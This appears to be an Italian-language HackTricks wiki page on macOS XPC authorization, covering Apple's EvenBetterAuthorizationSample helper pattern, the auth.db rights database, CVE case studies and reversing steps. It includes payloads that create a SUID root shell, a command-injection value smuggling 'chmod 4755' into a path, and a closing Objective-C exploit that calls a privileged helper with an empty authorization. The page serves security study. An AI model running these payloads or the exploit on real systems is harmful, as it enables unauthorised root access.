# Autorizzazione XPC

{{#include ../../../../../banners/hacktricks-training.md}}

## Autorizzazione XPC

Apple fornisce anche un altro modo per autenticare se il processo connesso ha **l'autorizzazione per chiamare un metodo XPC esposto**.<sup>[[2]](#references)</sup>

Quando un'applicazione deve **eseguire azioni come utente privilegiato**, invece di eseguire l'app come utente privilegiato, di solito installa come root un HelperTool come servizio XPC che può essere chiamato dall'app per eseguire tali azioni. Tuttavia, l'app che chiama il servizio dovrebbe disporre di un'autorizzazione sufficiente.

### ShouldAcceptNewConnection sempre YES

Un esempio si può trovare in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` tenta di **connettersi** al **HelperTool**. E in `HelperTool/HelperTool.m` la funzione **`shouldAcceptNewConnection`** **non controllerà** nessuno dei requisiti indicati in precedenza. Restituirà sempre YES:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Per ulteriori informazioni su come configurare correttamente questo check:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Diritti dell'applicazione

Tuttavia, **l'autorizzazione viene verificata quando viene chiamato un metodo da HelperTool**.

La funzione **`applicationDidFinishLaunching`** di `App/AppDelegate.m` creerà un riferimento di autorizzazione vuoto dopo l'avvio dell'app. Questo dovrebbe funzionare sempre.\
Successivamente, proverà ad **aggiungere alcuni diritti** a quel riferimento di autorizzazione chiamando `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
La funzione `setupAuthorizationRights` di `Common/Common.m` memorizzerà nel database auth `/var/db/auth.db` i diritti dell'applicazione. Si noti che aggiungerà solo i diritti che non sono ancora presenti nel database:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
La funzione `enumerateRightsUsingBlock` è quella utilizzata per ottenere le autorizzazioni delle applicazioni, definite in `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Questo significa che, al termine di questo processo, i permessi dichiarati all'interno di `commandInfo` verranno memorizzati in `/var/db/auth.db`. Per **ogni metodo** che **richiederà l'autenticazione**, il database contiene il **nome del permesso** e **`kCommandKeyAuthRightDefault`**. Quest'ultimo **indica chi può ottenere questo diritto**.<sup>[[1]](#references)</sup>

Esistono diversi ambiti per indicare chi può accedere a un diritto. Alcuni sono definiti in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (puoi trovarli [tutti qui](https://www.dssw.co.uk/reference/authorization-rights/)), ma in sintesi:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Chiunque</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nessuno</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>L'utente corrente deve essere un amministratore (all'interno del gruppo admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Chiede all'utente di autenticarsi.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Chiede all'utente di autenticarsi. Deve essere un amministratore (all'interno del gruppo admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Specifica le regole</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Specifica commenti aggiuntivi sul diritto</td></tr></tbody></table>

### Verifica dei diritti

In `HelperTool/HelperTool.m`, la funzione **`readLicenseKeyAuthorization`** verifica se il chiamante è autorizzato a **eseguire questo metodo** chiamando la funzione **`checkAuthorization`**. Questa funzione verifica che **authData** inviato dal processo chiamante abbia un **formato corretto** e quindi controlla **cosa è necessario per ottenere il diritto** di chiamare il metodo specifico. Se tutto va bene, l'**`error` restituito sarà `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Per **verificare i requisiti per ottenere il diritto** di chiamare quel metodo, `authorizationRightForCommand` controlla l'oggetto **`commandInfo`** menzionato in precedenza. Quindi chiama **`AuthorizationCopyRights`** per verificare **se il chiamante dispone dei diritti** per invocare la funzione (si noti che i flag consentono l'interazione con l'utente).<sup>[[1]](#references)[[3]](#references)</sup>

In questo caso, per chiamare la funzione `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` è definito come `@kAuthorizationRuleClassAllow`. Pertanto **chiunque può chiamarla**.

### Informazioni sul database

È stato menzionato che queste informazioni sono memorizzate in `/var/db/auth.db`. È possibile elencare tutte le regole memorizzate con:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Quindi, puoi leggere chi può accedere a tale diritto con:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

Puoi trovare **tutte le configurazioni delle autorizzazioni** [**qui**](https://www.dssw.co.uk/reference/authorization-rights/), ma le combinazioni che non richiederanno l'interazione dell'utente sarebbero:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- Questa è la chiave più diretta. Se impostata su `false`, specifica che un utente non deve fornire l'autenticazione per ottenere questo diritto.
- Viene utilizzata **in combinazione con una delle 2 chiavi seguenti oppure indicando un gruppo** a cui l'utente deve appartenere.
2. **'allow-root': 'true'**
- Se un utente opera come utente root (che dispone di autorizzazioni elevate) e questa chiave è impostata su `true`, l'utente root potrebbe potenzialmente ottenere questo diritto senza un'ulteriore autenticazione. Tuttavia, in genere, ottenere lo stato di utente root richiede già l'autenticazione, quindi per la maggior parte degli utenti questo non è uno scenario di "assenza di autenticazione".
3. **'session-owner': 'true'**
- Se impostata su `true`, il proprietario della sessione (l'utente attualmente connesso) otterrebbe automaticamente questo diritto. Questo potrebbe bypassare un'ulteriore autenticazione se l'utente ha già effettuato l'accesso.
4. **'shared': 'true'**
- Questa chiave non concede diritti senza autenticazione. Se impostata su `true`, significa invece che, una volta autenticato il diritto, questo può essere condiviso tra più processi senza che ciascuno debba effettuare nuovamente l'autenticazione. Tuttavia, la concessione iniziale del diritto richiederebbe comunque l'autenticazione, a meno che non sia combinata con altre chiavi come `'authenticate-user': 'false'`.

Puoi [**utilizzare questo script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) per ottenere i diritti interessanti:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Casi di studio sui bypass dell'autorizzazione

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: il servizio Mach privilegiato `com.acustica.HelperTool` accetta ogni connessione e la routine `checkAuthorization:` chiama `AuthorizationCopyRights(NULL, …)`, quindi qualsiasi blob di 32 byte viene accettato. `executeCommand:authorization:withReply:` passa quindi stringhe separate da virgole controllate dall'attaccante a `NSTask` come root, rendendo possibili payload come:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
creare facilmente una shell SUID root. Dettagli in [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Il listener restituisce sempre YES e lo stesso pattern `AuthorizationCopyRights` con valore NULL compare in `checkAuthorization:`. Il metodo `exchangeAppWithReply:` concatena due volte l’input dell’attacker in una stringa `system()`, quindi inserire metacaratteri shell in `appPath` (ad esempio `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) consente l’esecuzione di codice come root tramite il Mach service `com.plugin-alliance.pa-installationhelper`. Maggiori informazioni [qui](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: L’esecuzione di un audit crea `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, espone il Mach service `com.jamf.complianceeditor.helper` ed esporta `-executeScriptAt:arguments:then:` senza verificare l’`AuthorizationExternalForm` o la code signature del chiamante. Un exploit banale esegue `AuthorizationCreate` su un riferimento vuoto, si connette con `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` e invoca il metodo per eseguire binari arbitrari come root. Le note complete del reversing (con PoC) sono disponibili nel [write-up di Mykola Grymalyuk](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 e 7.4.0–7.4.2 accettava messaggi XPC appositamente creati che raggiungevano un helper privilegiato privo di controlli di autorizzazione. Poiché l’helper si fidava del proprio `AuthorizationRef` privilegiato, qualsiasi utente locale in grado di inviare messaggi al service poteva indurlo a eseguire modifiche di configurazione o comandi arbitrari come root. Dettagli nel [riepilogo dell’advisory di SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Suggerimenti per un triage rapido

- Quando un’app include sia una GUI sia un helper, esegui il diff dei requisiti del codice e verifica se `shouldAcceptNewConnection` blocca il listener con `-setCodeSigningRequirement:` (oppure valida `SecCodeCopySigningInformation`). L’assenza di questi controlli porta spesso a scenari CWE-863 come nel caso Jamf. Un rapido controllo appare così:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Confronta ciò che l’helper *pensa* di autorizzare con ciò che fornisce il client. Durante il reversing, imposta un breakpoint su `AuthorizationCopyRights` e verifica che `AuthorizationRef` provenga da `AuthorizationCreateFromExternalForm` (fornito dal client) invece che dal contesto privilegiato dell’helper; altrimenti probabilmente hai individuato un pattern CWE-863 simile ai casi precedenti.

## Reversing Authorization

### Verificare se viene usato EvenBetterAuthorization

Se trovi la funzione: **`[HelperTool checkAuthorization:command:]`**, probabilmente il processo usa lo schema di autorizzazione menzionato in precedenza:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Se questa funzione chiama API come `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights` e `AuthorizationFree`, sta usando il pattern [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Controlla **`/var/db/auth.db`** per verificare se è possibile ottenere i permessi necessari per chiamare qualche azione privilegiata senza interazione dell’utente.

### Comunicazione del protocollo

Successivamente, devi trovare lo schema del protocollo per poter stabilire una comunicazione con il servizio XPC.

La funzione **`shouldAcceptNewConnection`** indica il protocollo esportato:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In questo caso, abbiamo lo stesso schema di EvenBetterAuthorizationSample; [**controlla questa riga**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Conoscendo il nome del protocollo utilizzato, è possibile **eseguire il dump della definizione del relativo header** con:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Infine, dobbiamo solo conoscere il **name del Mach Service esposto** per poter stabilire una comunicazione con esso. Esistono diversi modi per trovarlo:

- In **`[HelperTool init]`**, dove è possibile vedere il Mach Service utilizzato:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Nel plist di launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Esempio di exploit

In questo esempio vengono creati:

- La definizione del protocollo con le funzioni
- Un auth vuoto da utilizzare per richiedere l'accesso
- Una connessione al servizio XPC
- Una chiamata alla funzione se la connessione è riuscita
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Altri helper di privilegio XPC abusati

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Servizi di autorizzazione](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Privilege Escalation di Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: Vulnerabilità di Privilege Escalation di FortiClient per Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Privilege Escalation locale del servizio XPC Acustica Audio HelperTool in Aquarius Desktop su macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Privilege Escalation locale del servizio XPC InstallationHelper di Plugin Alliance](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Privilege Escalation del framework Apple EndpointSecurity (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Riferimento ai diritti di autorizzazione (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
